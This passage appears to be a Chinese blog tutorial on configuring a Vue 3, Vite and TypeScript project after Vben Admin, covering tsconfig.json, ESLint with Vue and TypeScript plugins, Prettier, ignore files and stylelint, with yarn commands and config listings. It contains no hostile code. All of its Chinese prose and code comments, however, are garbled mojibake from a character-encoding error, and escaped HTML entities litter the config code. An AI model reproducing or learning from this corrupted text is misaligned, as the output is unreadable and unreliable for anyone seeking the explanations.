…ç›®çš„æ™‚å€™package.jsonå°±è‡ªå¸¶äº†typescriptã€‚è©²ä¾è³´æœƒç·¨è­¯æˆ‘å€‘çš„tsæ–‡ä»¶ã€‚é‚£éº¼æ˜¯ä¾è³´æˆ‘å€‘å°±å¯ä»¥é…ç½®å®ƒã€‚é…ç½®å…§å®¹é‚„æ˜¯ç…§æ¬Vbençš„ï¼ŒåŠ ä¸Šè¨»é‡‹å’Œè¦å‰‡ä¾†æºã€‚\nå®˜æ–¹æ–‡æª”-tsconfig.jsonæ–‡ä»¶ å®˜æ–¹æ–‡æª”-TSç·¨è­¯é¸é … ä½ ä¸çŸ¥é“çš„ tsconfig.json åƒè€ƒéˆæ¥ å‰µå»ºé…ç½®æ–‡ä»¶ æ ¹ç›®éŒ„ä¸‹å‰µå»ºï¼štsconfig.jsonæ–‡ä»¶ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 { \u0026#34;compilerOptions\u0026#34;: { // â†“ æŒ‡å®šECMAScriptç›®æ¨™ç‰ˆæœ¬ï¼Œesnextç‚ºæœ€æ–°ç‰ˆæœ¬ \u0026#34;target\u0026#34;: \u0026#34;esnext\u0026#34;, // â†“ æŒ‡å®šç”Ÿæˆå“ªå€‹æ¨¡å¡Šç³»çµ±ä»£ç¢¼ï¼Œesnextç‚ºæœ€æ–°ç‰ˆæœ¬ \u0026#34;module\u0026#34;: \u0026#34;esnext\u0026#34;, // â†“ æ±ºå®šå¦‚ä½•è™•ç†æ¨¡å¡Šã€‚ \u0026#34;moduleResolution\u0026#34;: \u0026#34;node\u0026#34;, // â†“ å•Ÿç”¨æ‰€æœ‰åš´æ ¼é¡å‹æª¢æŸ¥é¸é …ã€‚ \u0026#34;strict\u0026#34;: true, // â†“ ç¦æ­¢å°åŒä¸€å€‹æ–‡ä»¶çš„ä¸ä¸€è‡´çš„å¼•ç”¨ã€‚ \u0026#34;forceConsistentCasingInFileNames\u0026#34;: true, // â†“ å…è¨±å¾æ²’æœ‰è¨­ç½®é»˜èªå°å‡ºçš„æ¨¡å¡Šä¸­é»˜èªå°å…¥ã€‚é€™ä¸¦ä¸å½±éŸ¿ä»£ç¢¼çš„è¼¸å‡ºï¼Œåƒ…ç‚ºäº†é¡å‹æª¢æŸ¥ã€‚ \u0026#34;allowSyntheticDefaultImports\u0026#34;: true, // â†“ ç¦ç”¨å‡½æ•¸åƒæ•¸é›™å‘å”è®Šæª¢æŸ¥ã€‚ \u0026#34;strictFunctionTypes\u0026#34;: false, // â†“ åœ¨ .tsxæ–‡ä»¶è£¡æ”¯æŒJSX \u0026#34;jsx\u0026#34;: \u0026#34;preserve\u0026#34;, // â†“ è§£æéç›¸å°æ¨¡å¡Šåçš„åŸºæº–ç›®éŒ„ã€‚æŸ¥çœ‹ æ¨¡å¡Šè§£ææ–‡æª”äº†è§£è©³æƒ…ã€‚ \u0026#34;baseUrl\u0026#34;: \u0026#34;.\u0026#34;, // â†“ å…è¨±ç·¨è­¯javascriptæ–‡ä»¶ã€‚ \u0026#34;allowJs\u0026#34;: true, // â†“ ç”Ÿæˆç›¸æ‡‰çš„ .mapæ–‡ä»¶ã€‚ \u0026#34;sourceMap\u0026#34;: true, \u0026#34;esModuleInterop\u0026#34;: true, \u0026#34;resolveJsonModule\u0026#34;: true, // â†“ è‹¥æœ‰æœªä½¿ç”¨çš„å±€éƒ¨è®Šé‡å‰‡æ‹‹éŒ¯ã€‚ \u0026#34;noUnusedLocals\u0026#34;: true, // â†“ è‹¥æœ‰æœªä½¿ç”¨çš„åƒæ•¸å‰‡æ‹‹éŒ¯ã€‚ \u0026#34;noUnusedParameters\u0026#34;: true, // â†“ å•Ÿç”¨å¯¦é©—æ€§çš„ESè£é£¾å™¨ã€‚ \u0026#34;experimentalDecorators\u0026#34;: true, // â†“ ç·¨è­¯éç¨‹ä¸­éœ€è¦å¼•å…¥çš„åº«æ–‡ä»¶çš„åˆ—è¡¨ã€‚ \u0026#34;lib\u0026#34;: [\u0026#34;dom\u0026#34;, \u0026#34;esnext\u0026#34;], // â†“ è¦åŒ…å«çš„é¡å‹è²æ˜æ–‡ä»¶ååˆ—è¡¨ã€‚ \u0026#34;types\u0026#34;: [\u0026#34;vite/client\u0026#34;], // â†“ è¦åŒ…å«çš„é¡å‹è²æ˜æ–‡ä»¶è·¯å¾‘åˆ—è¡¨ã€‚ \u0026#34;typeRoots\u0026#34;: [\u0026#34;./node_modules/@types/\u0026#34;, \u0026#34;./types\u0026#34;], \u0026#34;incremental\u0026#34;: true, // â†“ åœ¨è¡¨é”å¼å’Œè²æ˜ä¸Šæœ‰éš±å«çš„ anyé¡å‹æ™‚å ±éŒ¯ã€‚ \u0026#34;noImplicitAny\u0026#34;: false, // â†“ å¿½ç•¥æ‰€æœ‰çš„è²æ˜æ–‡ä»¶ï¼ˆ *.d.tsï¼‰çš„é¡å‹æª¢æŸ¥ã€‚ \u0026#34;skipLibCheck\u0026#34;: true, // â†“ æ¨¡å¡Šååˆ°åŸºæ–¼ baseUrlçš„è·¯å¾‘æ˜ å°„çš„åˆ—è¡¨ã€‚æŸ¥çœ‹ æ¨¡å¡Šè§£ææ–‡æª”äº†è§£è©³æƒ…ã€‚ \u0026#34;paths\u0026#34;: { \u0026#34;/@/*\u0026#34;: [\u0026#34;src/*\u0026#34;], \u0026#34;/#/*\u0026#34;: [\u0026#34;types/*\u0026#34;] } }, // â†“ æŒ‡å®šä¸€å€‹åŒ¹é…åˆ—è¡¨ï¼ˆå±¬æ–¼è‡ªå‹•æŒ‡å®šè©²è·¯å¾‘ä¸‹çš„æ‰€æœ‰tsç›¸é—œæ–‡ä»¶ï¼‰ \u0026#34;include\u0026#34;: [ \u0026#34;src/**/*.ts\u0026#34;, \u0026#34;src/**/*.d.ts\u0026#34;, \u0026#34;src/**/*.tsx\u0026#34;, \u0026#34;src/**/*.vue\u0026#34;, \u0026#34;types/**/*.d.ts\u0026#34;, \u0026#34;types/**/*.ts\u0026#34;, \u0026#34;mock/**/*.ts\u0026#34; ], // â†“ æŒ‡å®šä¸€å€‹æ’é™¤åˆ—è¡¨ï¼ˆincludeçš„åå‘æ“ä½œï¼‰ \u0026#34;exclude\u0026#34;: [\u0026#34;node_modules\u0026#34;, \u0026#34;dist\u0026#34;, \u0026#34;**/*.js\u0026#34;] } é€™è£¡é…ç½®å®ŒESLintä¹‹å¾Œæœƒå ±éŒ¯ï¼Œèªªæ‰¾ä¸åˆ°vite/clientã€‚ä¸ç”¨ç®¡å®ƒï¼Œç•¶ä½ åŸ·è¡Œå®Œå¾Œé¢çš„ESLint-TSçš„æ™‚å€™å°±ä¸æœƒå ±éŒ¯äº†ã€‚\nå®‰è£ ESLint èªªæ˜ ESLintç°¡å–®çš„ä¾†èªªå°±æ˜¯å»åˆ¤æ–·ä½ çš„JSä»£ç¢¼å¯«çš„æ ¼å¼å°ä¸å°çš„ä¸€å€‹ä¾è³´ã€‚æ²’æœ‰å®ƒä½ çš„ä»£ç¢¼ä¹Ÿèƒ½é‹è¡Œï¼Œæœ‰äº†å®ƒä½ çš„ä»£ç¢¼å¯ä»¥å¯«çš„æ›´æ¼‚äº®ã€‚ ESLinté‚„æ”¯æŒæ’ä»¶ï¼Œç¬¬ä¸‰æ–¹æ¡†æ¶æœƒåŸºæ–¼ESLintå¯«å‡ºè‡ªå·±çš„ä»£ç¢¼æª¢æŸ¥æ’ä»¶ã€‚æ¯”å¦‚Vue3å°æ‡‰eslint-plugin-vueã€‚\nESLintå®˜ç¶² ESLint-å¿«é€Ÿå…¥é–€ é…ç½®ESLint ESLintçš„é…ç½®è¦å‰‡ å®‰è£ ESLint 1 yarn add eslint --dev é…ç½®ESLintï¼šæ ¹ç›®éŒ„ä¸‹å‰µå»ºï¼š.eslintrc.jsæ–‡ä»¶ã€‚ é€™è£¡å¯ä»¥ä½¿ç”¨eslintçš„initã€‚ä½†æ˜¯æˆ‘ä¸æ¸…æ¥šVbençš„åˆå§‹åŒ–æ“ä½œæ˜¯æ€éº¼é¸çš„ï¼Œæ‰€ä»¥ç›´æ¥æ‹·è²Vbençš„é…ç½®ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 module.exports = { // â†“ é»˜èªæƒ…æ³ä¸‹ï¼ŒESLint æœƒåœ¨æ‰€æœ‰çˆ¶ç´šç›®éŒ„è£¡å°‹æ‰¾é…ç½®æ–‡ä»¶ï¼Œä¸€ç›´åˆ°æ ¹ç›®éŒ„ã€‚å¦‚æœä½ æƒ³è¦ä½ æ‰€æœ‰é …ç›®éƒ½éµå¾ªä¸€å€‹ç‰¹å®šçš„ç´„å®šæ™‚ï¼Œé€™å°‡æœƒå¾ˆæœ‰ç”¨ï¼Œä½†æœ‰æ™‚å€™æœƒå°è‡´æ„æƒ³ä¸åˆ°çš„çµæœã€‚ç‚ºäº†å°‡ ESLint é™è£½åˆ°ä¸€å€‹ç‰¹å®šçš„é …ç›®ï¼Œåœ¨ä½ é …ç›®æ ¹ç›®éŒ„ä¸‹çš„ package.json æ–‡ä»¶æˆ–è€… .eslintrc.* æ–‡ä»¶è£¡çš„ eslintConfig å­—æ®µä¸‹è¨­ç½® \u0026#34;root\u0026#34;: trueã€‚ ESLint ä¸€æ—¦ç™¼ç¾é…ç½®æ–‡ä»¶ä¸­æœ‰ \u0026#34;root\u0026#34;: trueï¼Œå®ƒå°±æœƒåœæ­¢åœ¨çˆ¶ç´šç›®éŒ„ä¸­å°‹æ‰¾ã€‚ // â†“ æ­¤é …æ˜¯ç”¨ä¾†å‘Šè¨´eslintæ‰¾ç•¶å‰é…ç½®æ–‡ä»¶ä¸èƒ½å¾€çˆ¶ç´šæŸ¥æ‰¾ root: true, // â†“ æŒ‡å®šä½ æƒ³å•Ÿç”¨çš„ç’°å¢ƒ env: { browser: true, node: true, es6: true, }, // â†“ è¨­ç½®è§£æå™¨ parser: \u0026#34;\u0026#34;, // â†“ è§£æå™¨é¸é … parserOptions: {}, // â†“ æ“´å±•é … extends: [], // â†“ è‡ªå®šç¾©è¦å‰‡é…ç½® rules: {} } é…ç½®ESLintå¿½ç•¥æ–‡ä»¶ï¼šæ ¹ç›®éŒ„ä¸‹å‰µå»ºï¼š.eslintignoreæ–‡ä»¶ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 *.sh node_modules *.md *.woff *.ttf .vscode .idea dist /public /docs .husky .local /bin Dockerfile å®‰è£ eslint-plugin-vue èªªæ˜ ESLintæ˜¯æª¢æŸ¥JSä»£ç¢¼çš„ä¾è³´ï¼Œé‚£éº¼å®ƒæ€éº¼å»æª¢æŸ¥Vueèªæ³•çš„æ–‡ä»¶å‘¢ï¼Ÿè¦å®Œæˆé€™ä»¶äº‹ï¼Œæˆ‘å€‘å°±éœ€è¦å®‰è£vueå®˜æ–¹é–‹ç™¼çš„ESLintæ’ä»¶eslint-plugin-vueã€‚é€™æ¨£ESLintå°±çŸ¥é“è©²æ€éº¼æª¢æŸ¥vueçš„æ–‡ä»¶äº†ã€‚\neslint-plugin-vueçš„å®˜æ–¹æ–‡æª” eslint-plugin-vueçš„npmé¦–é  vue eslint å‡ç´š_ESLint çš„ parser æ˜¯å€‹ä»€éº¼æ±è¥¿ vue-eslint-parserçš„Gitåœ°å€ æ€éº¼ç†è§£eslint-plugin-vueå’Œvue-eslint-parserçš„é—œä¿‚å‘¢?\nESLint æœƒå°æˆ‘å€‘çš„ä»£ç¢¼é€²è¡Œæ ¡é©—ï¼Œè€Œ parser çš„ä½œç”¨æ˜¯å°‡æˆ‘å€‘å¯«çš„ä»£ç¢¼è½‰æ›ç‚º ESTreeï¼ŒESLint æœƒå° ESTree é€²è¡Œæ ¡é©—ã€‚\nvue-eslint-parseræ–‡æª”ä¸Šèªªæ˜¯vueçš„æ¨¡æ¿è§£æå™¨ã€‚ vue-eslint-parserçš„æ–‡æª”ä¸­å¼·èª¿\u0026lt;template\u0026gt;æ¨™ç±¤ä¸­çš„å…§å®¹é€²è¡Œæª¢æŸ¥ã€‚\né‚£éº¼æˆ‘çš„ç†è§£æ˜¯vue-eslint-parserå°‡vueæ–‡ä»¶è½‰æ›æˆESTreeã€‚ç„¶å¾Œä½¿ç”¨eslint-plugin-vueä¾†æª¢æŸ¥é€™å€‹ESTreeã€‚æŸ¥å‡ºçš„çµæœäº¤çµ¦ESLintã€‚\nvue-eslint-parserçš„å®˜æ–¹èªªæ˜ï¼š\nThis parser allows us to lint the \u0026lt;template\u0026gt; of .vue files. We can make mistakes easily on \u0026lt;template\u0026gt; if we use complex directives and expressions in the template. This parser and the rules of eslint-plugin-vue would catch some of the mistakes.\né€™å€‹è§£æå™¨å…è¨±æˆ‘å€‘å°.vueæ–‡ä»¶çš„\u0026lt;template\u0026gt;é€²è¡Œæª¢æŸ¥ã€‚å¦‚æœæˆ‘å€‘åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨äº†è¤‡é›œçš„æŒ‡ä»¤å’Œè¡¨é”å¼ï¼Œæˆ‘å€‘å¾ˆå®¹æ˜“åœ¨\u0026lt;template\u0026gt;ä¸Šå‡ºéŒ¯ã€‚é€™å€‹è§£æå™¨å’Œeslint-plugin-vueçš„è¦å‰‡å¯ä»¥ç™¼ç¾ä¸€äº›éŒ¯èª¤ã€‚\nç¸½ä¹‹eslint-plugin-vueå’Œvue-eslint-parseréœ€è¦ä¸€èµ·ä½¿ç”¨ï¼Œè€Œä¸”å®˜ç¶²ä¹Ÿæœ‰æ¨™ç¤ºæ€éº¼æ“ä½œã€‚\nå®‰è£å…©å€‹ npm æ’ä»¶ 1 yarn add eslint-plugin-vue vue-eslint-parser --dev å°‡æ’ä»¶é…ç½®é€²ESLint é…ç½®ESLintï¼šæ ¹ç›®éŒ„ä¸‹ä¿®æ”¹ï¼š.eslintrc.jsæ–‡ä»¶ .eslintrc.js 1 2 3 4 5 6 7 8 9 module.exports = { // ... parser: \u0026#39;vue-eslint-parser\u0026#39;, // ... extends: [ \u0026#39;plugin:vue/vue3-recommended\u0026#39;, ], // ... } å®‰è£ @typescript-eslint èªªæ˜ é€™è£¡åŒç†éœ€è¦å®‰è£ @typescript-eslint/eslint-plugin å’Œ @typescript-eslint/parserã€‚\nTS-ESLintè¦å‰‡ @typescript-eslint/eslint-pluginçš„npmé¦–é  @typescript-eslint/parserçš„npmé¦–é  å®‰è£TSçš„Lint 1 yarn add @typescript-eslint/eslint-plugin @typescript-eslint/parser --dev å°‡æ’ä»¶é…ç½®é€²ESLint é…ç½®ESLintï¼šæ ¹ç›®éŒ„ä¸‹ä¿®æ”¹ï¼š.eslintrc.jsæ–‡ä»¶ .eslintrc.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 module.exports = { // ... parserOptions: { parser: \u0026#34;@typescript-eslint/parser\u0026#34;, ecmaVersion: 2020, sourceType: \u0026#34;module\u0026#34;, jsxPragma: \u0026#34;React\u0026#34;, ecmaFeatures: { jsx: true, tsx: true, }, }, extends: [\u0026#34;plugin:vue/vue3-recommended\u0026#34;, \u0026#34;plugin:@typescript-eslint/recommended\u0026#34;], // ... } å®‰è£ eslint-plugin-prettier èªªæ˜ prettierç”¨ä¾†æ ¼å¼åŒ–ä»£ç¢¼çš„ã€‚ä¸€èˆ¬IDEéƒ½æœ‰prettierçš„æ’ä»¶ï¼Œåœ¨ä¿å­˜çš„æ™‚å€™æ ¼å¼åŒ–ä»£ç¢¼ã€‚é‚£éº¼æˆ‘å€‘eslint-plugin-prettierå°±æ˜¯é€šéJSä¾†åˆ¤æ–·ä»£ç¢¼æ ¼å¼æ˜¯å¦æ­£ç¢ºã€‚ ä¸€èˆ¬é€™å¾ˆå¿…è¦ï¼Œå› ç‚ºä¸åŒçš„ç¨‹åºå“¡æœ‰ä¸åŒçš„IDEï¼Œä¸åŒçš„IDEæœ‰ä¸åŒçš„prettieræ’ä»¶ã€‚ä½†å°æ–¼é …ç›®ä¾†èªªåªæœ‰ä¸€å€‹eslint-plugin-prettierã€‚\nè€Œeslint-plugin-prettieræ’ä»¶ä¾è³´æ–¼prettierä¾è³´ã€‚é‚£éº¼eslint-config-prettieræ’ä»¶åˆæ˜¯å¹¹å˜›çš„ï¼Ÿ\nprettierå’ŒESLintä¹‹é–“æœ‰äº›è¦å‰‡ä¸ä¸€æ¨£ï¼Œå› æ­¤æ˜¯ç”¨æ–¼è§£æ±ºè¡çªå¾—ã€‚eslint-config-prettierå°‡prettierä¸€äº›è¦å‰‡é»˜èªé—œé–‰äº†ã€‚\nä½¿ç”¨ESLint+Prettierä¾†çµ±ä¸€å‰ç«¯ä»£ç¢¼é¢¨æ ¼ prettieré¦–é  prettierçš„npmé¦–é  eslint-plugin-prettierçš„npmé¦–é  eslint-config-prettierçš„npmé¦–é  å®‰è£ 1 yarn add prettier eslint-plugin-prettier eslint-config-prettier --dev é…ç½®prettier prettierçš„é…ç½®é …\næ ¹ç›®éŒ„ä¸‹å‰µå»ºï¼šprettier.config.jsæ–‡ä»¶ prettier.config.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 module.exports = { printWidth: 100, tabWidth: 2, useTabs: false, semi: true, vueIndentScriptAndStyle: true, singleQuote: true, quoteProps: \u0026#39;as-needed\u0026#39;, bracketSpacing: true, trailingComma: \u0026#39;es5\u0026#39;, jsxBracketSameLine: false, jsxSingleQuote: false, arrowParens: \u0026#39;always\u0026#39;, insertPragma: false, requirePragma: false, proseWrap: \u0026#39;never\u0026#39;, htmlWhitespaceSensitivity: \u0026#39;strict\u0026#39;, endOfLine: \u0026#39;lf\u0026#39;, rangeStart: 0 } é…ç½®prettierå¿½ç•¥æ–‡ä»¶ æ ¹ç›®éŒ„ä¸‹å‰µå»ºï¼š.prettierignoreæ–‡ä»¶ .prettierignore 1 2 3 4 5 6 7 8 9 /dist/* .local .output.js /node_modules/** **/*.svg **/*.sh /public/* é…ç½®é€²ESLint é…ç½®ESLintï¼šä¿®æ”¹æ ¹ç›®éŒ„ä¸‹ï¼š.eslintrc.jsæ–‡ä»¶ .eslintrc.js 1 2 3 4 5 6 7 8 9 10 module.exports = { // ... extends: [ \u0026#34;plugin:vue/vue3-recommended\u0026#34;, \u0026#34;plugin:@typescript-eslint/recommended\u0026#34;, \u0026#34;prettier\u0026#34;, \u0026#34;plugin:prettier/recommended\u0026#34;, ], // ... } è‡ªå®šç¾©ESLintæª¢æŸ¥è¦å‰‡ èªªæ˜ ESLintæ˜¯ç”¨ä¾†æª¢æŸ¥ä»£ç¢¼çš„ã€‚åˆå®‰è£äº†é‚£éº¼å¤šçš„æ’ä»¶ã€‚ä½†æ˜¯å®˜æ–¹é»˜èªçš„æ–¹æ¡ˆæœ‰æ™‚ä¸ä¸€æ¨£ç¬¦åˆæˆ‘å€‘çš„è¦æ±‚ã€‚æˆ‘å€‘éœ€è¦è‡ªå®šç¾©è‡ªå·±çš„è¦å‰‡ã€‚\nä¿®æ”¹è¦å‰‡ä¸»è¦æ˜¯ä¿®æ”¹æ ¹ç›®éŒ„ä¸‹.eslintrc.jsæ–‡ä»¶çš„ruleså­—æ®µã€‚\nä¿®æ”¹è¦å‰‡ @typescript-eslint/ban-ts-ignore @typescript-eslint/explicit-function-return-type @typescript-eslint/no-explicit-any @typescript-eslint/no-var-requires @typescript-eslint/no-empty-function vue/custom-event-name-casing no-use-before-define @typescript-eslint/no-use-before-define @typescript-eslint/ban-ts-comment @typescript-eslint/ban-types @typescript-eslint/no-non-null-assertion @typescript-eslint/explicit-module-boundary-types @typescript-eslint/no-unused-vars no-unused-vars space-before-function-paren vue/attributes-order vue/one-component-per-file vue/html-closing-bracket-newline vue/max-attributes-per-line vue/multiline-html-element-content-newline singleline-html-element-content-newline vue/attribute-hyphenation vue/html-self-closing vue/require-default-prop é…ç½®ESLintï¼šæ ¹ç›®éŒ„ä¸‹ï¼š.eslintrc.jsæ–‡ä»¶ .eslintrc.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 module.exports = { // ... rules: { // â†“ ç¦æ­¢ä½¿ç”¨@ts-ignoreä¾†æ¶ˆé™¤ESLintæª¢æŸ¥ \u0026#39;@typescript-eslint/ban-ts-ignore\u0026#39;: \u0026#39;off\u0026#39;, // â†“ åœ¨å‡½æ•¸å’Œé¡æ–¹æ³•ä¸Šéœ€è¦é¡¯å¼çš„è¿”å›é¡å‹ \u0026#39;@typescript-eslint/explicit-function-return-type\u0026#39;: \u0026#39;off\u0026#39;, // â†“ ç¦æ­¢ä½¿ç”¨anyé¡å‹ \u0026#39;@typescript-eslint/no-explicit-any\u0026#39;: \u0026#39;off\u0026#39;, // â†“ é™¤å°å…¥èªå¥å¤–ï¼Œç¦æ­¢ä½¿ç”¨requireèªå¥ \u0026#39;@typescript-eslint/no-var-requires\u0026#39;: \u0026#39;off\u0026#39;, // â†“ ç¦æ­¢ä½¿ç”¨ç©ºå‡½æ•¸ \u0026#39;@typescript-eslint/no-empty-function\u0026#39;: \u0026#39;off\u0026#39;, // â†“ å°è‡ªå®šç¾©äº‹ä»¶åç¨±å¼·åˆ¶ä½¿ç”¨ç‰¹å®šçš„å¤§å°å¯« \u0026#39;vue/custom-event-name-casing\u0026#39;: \u0026#39;off\u0026#39;, // â†“ ç¦æ­¢å®šç¾©å‰ä½¿ç”¨ \u0026#39;no-use-before-define\u0026#39;: \u0026#39;off\u0026#39;, // â†“ åœ¨å®šç¾©è®Šé‡ä¹‹å‰ä¸å…è¨±ä½¿ç”¨è®Šé‡ \u0026#39;@typescript-eslint/no-use-before-define\u0026#39;: \u0026#39;off\u0026#39;, // â†“ ç¦æ­¢ä½¿ç”¨@ts-è¨»è§£ \u0026#39;@typescript-eslint/ban-ts-comment\u0026#39;: \u0026#39;off\u0026#39;, // â†“ ç¦æ­¢ä½¿ç”¨ç‰¹å®šé¡å‹ \u0026#39;@typescript-eslint/ban-types\u0026#39;: \u0026#39;off\u0026#39;, // â†“ ç¦æ­¢ä½¿ç”¨!å¾Œç¶´é‹ç®—ç¬¦é€²è¡Œénullæ–·è¨€ \u0026#39;@typescript-eslint/no-non-null-assertion\u0026#39;: \u0026#39;off\u0026#39;, // â†“ åœ¨å°å‡ºçš„å‡½æ•¸å’Œé¡çš„å…¬å…±é¡æ–¹æ³•ä¸Šéœ€è¦é¡¯å¼çš„è¿”å›å€¼å’Œåƒæ•¸é¡å‹ \u0026#39;@typescript-eslint/explicit-module-boundary-types\u0026#39;: \u0026#39;off\u0026#39;, // â†“ ç¦æ­¢ä½¿ç”¨æœªä½¿ç”¨çš„è®Šé‡ \u0026#39;@typescript-eslint/no-unused-vars\u0026#39;: [ \u0026#39;error\u0026#39;, { argsIgnorePattern: \u0026#39;^h$\u0026#39;, varsIgnorePattern: \u0026#39;^h$\u0026#39;, }, ], // â†“ ç¦æ­¢ä½¿ç”¨æœªä½¿ç”¨çš„è®Šé‡ \u0026#39;no-unused-vars\u0026#39;: [ \u0026#39;error\u0026#39;, { argsIgnorePattern: \u0026#39;^h$\u0026#39;, varsIgnorePattern: \u0026#39;^h$\u0026#39;, }, ], // â†“ åœ¨å‡½æ•¸æ‹¬è™Ÿå‰éœ€è¦æˆ–ä¸å…è¨±æœ‰ç©ºæ ¼ \u0026#39;space-before-function-paren\u0026#39;: \u0026#39;off\u0026#39;, // â†“ å¼·åˆ¶å±¬æ€§é †åº \u0026#39;vue/attributes-order\u0026#39;: \u0026#39;off\u0026#39;, // â†“ å¼·åˆ¶æ¯å€‹çµ„ä»¶æ‡‰ä½æ–¼å…¶è‡ªå·±çš„æ–‡ä»¶ä¸­ \u0026#39;vue/one-component-per-file\u0026#39;: \u0026#39;off\u0026#39;, // â†“ åœ¨æ¨™ç±¤çš„å³æ‹¬è™Ÿä¹‹å‰è¦æ±‚æˆ–ä¸å…è¨±æ›è¡Œ \u0026#39;vue/html-closing-bracket-newline\u0026#39;: \u0026#39;off\u0026#39;, // â†“ å¼·åˆ¶æ¯è¡Œçš„æœ€å¤§å±¬æ€§æ•¸ \u0026#39;vue/max-attributes-per-line\u0026#39;: \u0026#39;off\u0026#39;, // â†“ åœ¨å¤šè¡Œå…ƒç´ çš„å…§å®¹ä¹‹å‰å’Œä¹‹å¾Œéœ€è¦æ›è¡Œ \u0026#39;vue/multiline-html-element-content-newline\u0026#39;: \u0026#39;off\u0026#39;, // â†“ åœ¨å–®è¡Œå…ƒç´ çš„å…§å®¹ä¹‹å‰å’Œä¹‹å¾Œéœ€è¦æ›è¡Œ \u0026#39;vue/singleline-html-element-content-newline\u0026#39;: \u0026#39;off\u0026#39;, // â†“ åœ¨æ¨¡æ¿ä¸­çš„è‡ªå®šç¾©çµ„ä»¶ä¸Šå¯¦æ–½å±¬æ€§å‘½åæ¨£å¼ \u0026#39;vue/attribute-hyphenation\u0026#39;: \u0026#39;off\u0026#39;, // â†“ éœ€è¦é“å…·çš„é»˜èªå€¼ \u0026#39;vue/require-default-prop\u0026#39;: \u0026#39;off\u0026#39;, // â†“ å¯¦æ–½è‡ªæˆ‘å°é–‰çš„é¢¨æ ¼ // \u0026#39;vue/html-self-closing\u0026#39;: \u0026#39;off\u0026#39;, \u0026#39;vue/html-self-closing\u0026#39;: [ \u0026#39;error\u0026#39;, { html: { void: \u0026#39;always\u0026#39;, normal: \u0026#39;never\u0026#39;, component: \u0026#39;always\u0026#39;, }, svg: \u0026#39;always\u0026#39;, math: \u0026#39;always\u0026#39; } ] } } vbené …ç›®é…ç½®gitå¿½ç•¥æ–‡ä»¶ èªªæ˜ é€™å€‹æ‡‰è©²æ˜¯é …ç›®ä¸€ä¸Šä¾†å°±è¦è™•ç†çš„ï¼Œä½†æ˜¯æˆ‘æ‰‹æ’•Vbençš„æ™‚å€™ï¼ŒæŒ‰ç…§é…ç½®æ–‡ä»¶çš„é †åºä¸‹ä¾†ï¼Œåˆ°ç¾åœ¨æ‰è™•ç†äº†ã€‚\nå‰µå»ºGitå¿½ç•¥æ–‡ä»¶ æ ¹ç›®éŒ„ä¸‹å‰µå»ºï¼š.gitignoreæ–‡ä»¶ .gitignore 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 node_modules .DS_Store dist dist-ssr *.local # other .npmrc .cache test/upload-server/static .local # local env files .env.local .env.*.local # Log files npm-debug.log* yarn-debug.log* yarn-error.log* pnpm-debug.log* # Editor directories and files .idea # .vscode *.suo *.ntvs* *.njsproj *.sln *.sw? å®‰è£style-lint èªªæ˜ é€™æ¬¡éœ€è¦å®‰è£å››å€‹æ’ä»¶stylelintã€stylelint-config-standardã€stylelint-config-prettierã€stylelint-orderã€‚\nstylelintæ˜¯å°æˆ‘å€‘ç·¨å¯«çš„æ¨£å¼é€²è¡Œæª¢æŸ¥çš„æ’ä»¶ã€‚ stylelint-config-standardæ˜¯stylelintæ“´å±•çš„æª¢æŸ¥æ¨™æº–åº«ã€‚ stylelint-config-prettieræ˜¯ç”¨ä¾†è§£æ±ºè¡çªçš„ï¼ˆä¼°è¨ˆåˆå’ŒESLintè¡çªäº†ï¼Œåƒè€ƒä¹‹å‰çš„prettierï¼‰ã€‚ stylelint-orderæ˜¯æª¢æŸ¥æˆ‘å€‘æ¨£å¼ç·¨å¯«é †åºçš„ã€‚ åƒè€ƒé€£çµ stylelintå®˜ç¶² stylelintçš„npmé¦–é  stylelint-config-standardçš„npmé¦–é ï¼šæ“´å±•ï¼Œæ¨™æº–åº« stylelint-config-prettierçš„npmé¦–é ï¼šæ“´å±•ï¼Œè§£æ±ºè¡çªçš„ stylelint-orderçš„npmé¦–é ï¼šæ’ä»¶ï¼Œæ¨£å¼æ’åº stylelinitçš„é…ç½®èªªæ˜ stylelintçš„é…ç½®è¦å‰‡ å®‰è£ 1 yarn add stylelint stylelint-config-standard stylelint-config-prettier stylelint-order --dev é…ç½®stylelint æ ¹ç›®éŒ„ä¸‹å‰µå»ºï¼šstylelint.config.jsæ–‡ä»¶ stylelint.config.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 module.exports = { // â†“ é€™å€‹å¥½åƒæ˜¯æ²’æœ‰ç”¨çš„ï¼Œä½†æ˜¯VbenAdminæ˜¯é€™éº¼å¯«çš„ root: true, // â†“ æ’ä»¶ plugins: [\u0026#39;stylelint-order\u0026#39;], // â†“ æ“´å±• extends: [\u0026#39;stylelint-config-standard\u0026#39;, \u0026#39;stylelint-config-prettier\u0026#39;], // â†“ è‡ªå®šç¾©è¦å‰‡ rules: {}, // â†“ å¿½ç•¥æª¢æŸ¥çš„æ–‡ä»¶ ignoreFiles: [\u0026#39;**/*.js\u0026#39;, \u0026#39;**/*.jsx\u0026#39;, \u0026#39;**/*.tsx\u0026#39;, \u0026#39;**/*.ts\u0026#39;] } é…ç½®è‡ªå®šç¾©æ¨£å¼è¦å‰‡ æ ¹ç›®éŒ„ä¸‹ä¿®æ”¹ï¼šstylelint.config.jsæ–‡ä»¶ stylelint.config.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 